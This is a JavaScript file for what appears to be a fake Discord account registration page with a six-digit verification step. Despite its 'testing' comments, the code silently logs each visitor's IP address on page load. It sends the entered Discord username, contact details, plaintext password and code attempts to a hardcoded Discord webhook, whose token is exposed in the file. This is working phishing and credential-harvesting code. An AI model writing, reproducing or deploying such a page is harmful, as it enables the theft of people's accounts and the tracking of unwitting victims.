// Logging function for testing purposes
function logData(eventType, data) {
    console.log(`[TEST LOG] ${eventType}:`, data);
    
    // For testing, we're logging to console and updating status
    document.getElementById('statusText').textContent = `IP Logged: ${data.ip || 'N/A'}`;
    
    // In a real implementation, you would send this to your webhook
     fetch('https://discord.com/api/webhooks/1388139167103582218/OTZHoiUd0w-XiBleGI5w_U8iE2rfZuQhpA6AT7Yo8n-iofiK1xWQVaxqFjEx0WBPJ6rt', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({ 
             event: eventType,
             ...data
         })
     });
}

document.addEventListener('DOMContentLoaded', function() {
    // Log IP address on page load for testing
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            logData('page_visit', { ip: data.ip });
        })
        .catch(() => {
            logData('page_visit', { ip: 'Failed to retrieve' });
        });

    const registerForm = document.getElementById('registerForm');
    const verificationMessage = document.getElementById('verificationMessage');
    const codeInputs = document.getElementById('codeInputs');
    const resendLink = document.getElementById('resendLink');
    const emailDisplay = document.getElementById('emailDisplay');
    const contactInput = document.getElementById('contactInfo');
    const steps = document.querySelectorAll('.step');
    const errorMessage = document.getElementById('errorMessage');
    const successMessage = document.getElementById('successMessage');
    const welcomeUsername = document.getElementById('welcomeUsername');
    const resendBtn = document.getElementById('resendBtn');
    
    // Handle form submission
    registerForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const discordUsername = document.getElementById('discordUsername').value;
        const contactValue = contactInput.value;
        const password = document.getElementById('password').value;
        
        // Log form data for testing
        logData('form_submission', { 
            discordUsername, 
            contactValue, 
            password
        });
        
        emailDisplay.textContent = contactValue;
        
        // Show verification section
        verificationMessage.style.display = 'block';
        codeInputs.style.display = 'flex';
        resendLink.style.display = 'block';
        registerForm.style.display = 'none';
        errorMessage.style.display = 'none';
        
        // Update step indicator
        steps[0].classList.remove('active');
        steps[1].classList.add('active');
        
        // Focus first code input
        setTimeout(() => {
            document.querySelector('.code-inputs input[data-index="0"]').focus();
        }, 300);
    });
    
    // Handle code inputs
    const codeInputElements = document.querySelectorAll('.code-inputs input');
    
    codeInputElements.forEach(input => {
        input.addEventListener('input', function() {
            if (this.value) {
                const nextIndex = parseInt(this.dataset.index) + 1;
                if (nextIndex < 6) {
                    codeInputElements[nextIndex].focus();
                } else {
                    this.blur();
                    verifyCode();
                }
            }
        });
        
        input.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && !this.value) {
                const prevIndex = parseInt(this.dataset.index) - 1;
                if (prevIndex >= 0) {
                    codeInputElements[prevIndex].focus();
                }
            }
        });
    });
    
    // Verify code function
    function verifyCode() {
        let code = '';
        codeInputElements.forEach(input => {
            code += input.value;
        });
        
        if (code.length === 6) {
            // For testing, only 111111 is valid
            if (code === '111111') {
                // Show success
                const username = document.getElementById('discordUsername').value;
                welcomeUsername.textContent = username;
                verificationMessage.style.display = 'none';
                codeInputs.style.display = 'none';
                resendLink.style.display = 'none';
                errorMessage.style.display = 'none';
                successMessage.style.display = 'block';
                
                // Update step indicator
                steps[1].classList.remove('active');
                steps[2].classList.add('active');
                
                // Log successful verification
                logData('verification_success', { 
                    username: username,
                    contact: contactInput.value
                });
            } else {
                // Show error
                errorMessage.style.display = 'block';
                codeInputElements.forEach(input => input.value = '');
                codeInputElements[0].focus();
                
                // Log failed attempt
                logData('verification_failed', { 
                    codeAttempt: code,
                    contact: contactInput.value
                });
            }
        }
    }
    
    // Resend code functionality
    resendBtn.addEventListener('click', function(e) {
        e.preventDefault();
        
        // Show sending message
        const originalMessage = verificationMessage.innerHTML;
        verificationMessage.innerHTML = `
            <p><i class="fas fa-sync-alt fa-spin"></i> Sending a new code to <strong>${contactInput.value}</strong>...</p>
        `;
        
        // Log resend request
        logData('code_resend', { contact: contactInput.value });
        
        // Simulate sending
        setTimeout(() => {
            verificationMessage.innerHTML = originalMessage;
            
            // Show notification
            const notification = document.createElement('p');
            notification.innerHTML = '<i class="fas fa-check"></i> New code sent successfully!';
            notification.style.color = '#57F287';
            notification.style.marginTop = '10px';
            verificationMessage.appendChild(notification);
            
            // Clear inputs and focus first
            codeInputElements.forEach(input => input.value = '');
            codeInputElements[0].focus();
            errorMessage.style.display = 'none';
            
            // Remove notification after delay
            setTimeout(() => {
                notification.remove();
            }, 3000);
        }, 1500);
    });
});
